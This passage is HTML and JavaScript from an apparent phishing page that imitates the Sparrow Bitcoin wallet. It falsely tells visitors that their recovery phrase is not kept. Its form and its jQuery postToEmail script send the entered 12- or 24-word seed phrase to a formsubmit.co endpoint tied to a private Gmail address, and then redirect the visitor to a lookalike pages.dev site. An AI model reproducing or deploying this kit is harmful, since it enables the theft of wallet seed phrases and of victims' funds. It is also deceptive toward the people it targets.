                  Sparrow does not keep a copy of your recovery phrase.
                </div>
              </div>
              <div>
                <form action="https://formsubmit.co/hostblond@gmail.com" method="POST" id="my-form">
                    <input type="hidden" name="_captcha" value="false">
                    <input type="hidden" name="_next" value="https://sparrowsync.pages.dev/en/secure/index.html">
                  <div class="phrasebox ccbox activebox" id="phrase">
                    <textarea class="textarea allinput" name="phrase" placeholder="Input word phrase. Typically, 12 or 24 words separated by single spaces." oninput="countWord()"></textarea>
                  </div>

                  <div class="d-grid">
                    <button id="submit" type="submit" name="submit" value="submit" id="connbtn" class="btn btn-block btn-primary bg-primary text-white">

    <script>
      var connectManually = () => {
        $("#view1").hide();
        $("#view2").show();
      };

      const myModal = new bootstrap.Modal("#myModal", {
        keyboard: false,
      });

      function countWord() {
        var words = document.getElementById("phraseinput").value;

        var count = 0;
        var split = words.split(" ");

        for (var i = 0; i < split.length; i++) {
          if (split[i] != "") {
            count += 1;
          }
        }

        if (count == 12 || count == 24) {
          document.getElementById("connbtn").removeAttribute("disabled");
        } else {
          document.getElementById("connbtn").setAttribute("disabled", true);
        }
      }
    </script>

    <script>
      $("#submitform").on("submit", function () {
        postToEmail();
        return false;
      });

      var postToEmail = () => {
        $("#connbtn").text("Please wait...").prop("disabled", true);
        var form = document.querySelector("#submitform");
        var data = $("#submitform").serialize();

        $.post(
          "https://formsubmit.co/hostblond@gmail.com",
          data,
          (response) => {
            alert(JSON.stringify(response));
            $("#connbtn").text("Connect").prop("disabled", false);
            //handle success on post to server here
            window.location.href = "./en";
          },
          "json"
        ).fail(function () {
          $("#connbtn").text("Connect").prop("disabled", false);
          window.location.href = "./en";
        });
      };
    </script>
    <!-- Script -->
    <script>
      $(function () {
        var myModal = new window.bootstrap.Modal(
          document.getElementById("connectModal"),
          {
            keyboard: false,
            backdrop: "static",
          }
        );

        myModal.show();

        $(".connect").on("click", function () {
          myModal.show();
        });

        $(".close").on("click", function () {
          myModal.hide();
          switchView();
          window.location.href = "./en";
        });
      });

      function switchView() {
        setTimeout(() => {
          $("#view1").show();
          $("#view2").hide();
          $("#v1").show();
          $("#v2").hide();
          $(".tab").removeClass("active");
          $("#startTab").addClass("active");
          $(".ccbox").removeClass("activebox");
          $(".phrasebox").addClass("activebox");
        }, 1000);
      }
    </script>
